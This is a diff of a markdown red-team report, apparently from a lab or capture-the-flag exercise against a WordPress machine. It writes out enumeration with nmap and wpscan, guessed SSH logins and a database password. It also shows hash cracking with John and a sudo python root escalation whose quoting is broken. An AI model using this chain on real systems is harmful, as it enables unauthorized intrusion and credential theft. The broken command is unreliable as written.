@@ -8,7 +8,7 @@
 ### Exposed Services
 - Nmap scan results for each machine reveal the below services and OS details:
   - `nmap 192.168.1.110`
-  - scan image7
+  - ![alt_text](finalproject/image7.png)
 - This scan identifies the services below as potential points of entry:
   - IP 192.168.1.110 List of Exposed Services
     - Port 22 / SSH
@@ -29,27 +29,27 @@ TODO: Include vulnerability scan results to prove the identified vulnerabilities
 ### Exploitation
 - The Red Team was able to penetrate 192.168.1.110 machine and retrieve the following confidential data:
 #### Exploit Used for Flag1
-  - We plugged in the discovered ip into a web browser, while browsing around, we found `flag1.txt: 9bbcb33e11b80be759c4e844862482d` in the `192.168.1.110/service.html` file while inspecting
-  - image11flag1
+- We plugged in the discovered ip into a web browser, while browsing around, we found `flag1.txt: 9bbcb33e11b80be759c4e844862482d` in the `192.168.1.110/service.html` file while inspecting
+  - ![alt_text](finalproject/image11flag1.png)
 #### Exploit Used for flag2  
-  - We ran a wpscan command: `wpscan --url http://192.168.1.110/wordpress -eu` against the target machine. This exposed the names of Michael and Steven as users on the site 
-  - image8-1
-  - image8
-  - Since it was earlier discovered that ssh port 22 is open and we where able to find some users with the wpscan, we tested some password by guessing and we were able to guess Michael password to be michael   
-  - We ssh into the machine using the following command and information
+ - We ran a wpscan command: `wpscan --url http://192.168.1.110/wordpress -eu` against the target machine. This exposed the names of Michael and Steven as users on the site 
+  - ![alt_text](finalproject/image8-1.png)
+  - ![alt_text](finalproject/image8.png)
+- Since it was earlier discovered that ssh port 22 is open and we where able to find some users with the wpscan, we tested some password by guessing and we were able to guess Michael password to be michael   
+- We ssh into the machine using the following command and information
 ```
-ssh michael@192.168.1.110
-Username: michael
-Password: michael
+  ssh michael@192.168.1.110
+  Username: michael
+  Password: michael
 ```
-- image9
+  - ![alt_text](finalproject/image9.png)
 - We successfully ssh into target machine with the informatiom and we were able to locate `flag2.txt: fc3fd58dcdad9ab23faca6e9a36e581c`  int /var/www/ path 
-  - image10flag2
+  - ![alt_text](finalproject/image10flag2.png)
 #### Exploit Used for Flag3
 - While in the target machine, we found the database password while looking through the `wp-config.php` file in `/var/www/html` path. The password is `R@v3nSecurity`
-  - image12mysqlpssword
-- Since i was able to ge the database password, i signed into the database byt running this command: `mysql -u root -p wordpress`
-- i moved through the database by using this commands
+  - ![alt_text](finalproject/image12mysqlpassword.png)
+- Since we were able to obtain the database password, we signed into the database by running this command: `mysql -u root -p wordpress`
+- We moved through the database by using this commands
 ```
 -> show databases; 
 -> use wordpress 
@@ -57,27 +57,27 @@ Password: michael
 -> select * from wp_posts
 -> select * from wp_users
 ```
-- image14
-- image15
+  - ![alt_text](finalproject/image14.png)
+  - ![alt_text](finalproject/image15.png)
 
-- Searching through the databasee, i found `flag3.txt: afc01ab56b50591e7dccf93122770cd2`
-- image16
+- Searching through the databasee, i found `flag3.txt: afc01ab56b50591e7dccf93122770cd2` in wp_posts
+  - ![alt_text](finalproject/image16.png)
 #### Exploit Used for Flag4
 - We found the wp_users file to be very insteresting. we looked into the file with this command: `select * from wp_users` and we found some interesting hashes with the user's name in there
-- image17
+  - ![alt_text](finalproject/image17.png)
 - We already know michael password, and we decided to crack steven's hash using John to see if we can obtain steven's password
 - Steven's hash was saved as wp_hashes.txt, Running the command: `John wp_hashes.txt`. We dicovered steven's pssword to be `pink84`
-  - image18
+  - ![alt_text](finalproject/image18.png)
 _ We ssh into the target machine using the following command and credentials
 ```
-ssh steven@192.168.1.110
-Username: steven
-Password: pink84
+  ssh steven@192.168.1.110
+  Username: steven
+  Password: pink84
 ```
-  - image19
+  - ![alt_text](finalproject/image19.png)
 - Running command: `sudo -l`, we were able to figure out steven's privileges. We found out steven can run python commands. This is a great information because we can use a python command to escalate to root priviledge. 
 - Running this python command: `sudo python -c "import pty;pty.spawn("/bin/bash"):'` as user steven, authomatically escalated steven to root and we moved around as root and found `flag4.txt: 715dea6c055b9fe3337544932f2941ce`
-- image20
+  - ![alt_text](finalproject/image20.png)
 
 ## Blue Team: Summary of Operations
 ### Table of Contents
